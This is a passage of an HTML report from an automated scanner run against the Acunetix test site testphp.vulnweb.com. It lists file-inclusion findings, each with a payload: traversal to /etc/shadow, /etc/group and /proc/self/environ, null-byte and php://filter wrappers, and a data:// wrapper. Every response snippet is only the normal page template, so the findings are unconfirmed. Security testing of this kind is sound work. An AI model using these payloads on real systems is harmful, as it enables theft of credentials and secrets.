+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:28</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>16. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Windows path traversal in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>..\..\..\..\Windows\System32\drivers\etc\hosts</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:29</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>17. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/shadow" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/shadow</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX shadow file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/shadow</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:29</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>18. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/hosts" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/hosts</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX hosts file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/hosts</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:30</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>19. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/group" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/group</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX group file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/group</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:31</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>20. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/issue" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/issue</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX issue file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/issue</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:31</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>21. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/proc/self/environ" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/proc/self/environ</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Process environment variables in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/proc/self/environ</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:32</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>22. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/proc/self/cmdline" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/proc/self/cmdline</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Process command line in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/proc/self/cmdline</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:33</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>23. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/passwd%2500" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/passwd%2500</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP null byte injection in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/passwd%00</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:33</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>24. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=php%3A//filter/convert.base64-encode/resource%3Dindex.php" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=php%3A//filter/convert.base64-encode/resource%3Dindex.php</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP filter wrapper in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>php://filter/convert.base64-encode/resource=index.php</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:34</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>25. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=php%3A//filter/read%3Dconvert.base64-encode/resource%3Dindex.php" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=php%3A//filter/read%3Dconvert.base64-encode/resource%3Dindex.php</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP filter read in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:35</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>26. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=data%3A//text/plain%3Bbase64%2CSSBsb3ZlIFBIUAo%3D" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=data%3A//text/plain%3Bbase64%2CSSBsb3ZlIFBIUAo%3D</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP data wrapper in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>data://text/plain;base64,SSBsb3ZlIFBIUAo=</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:35</em></p>
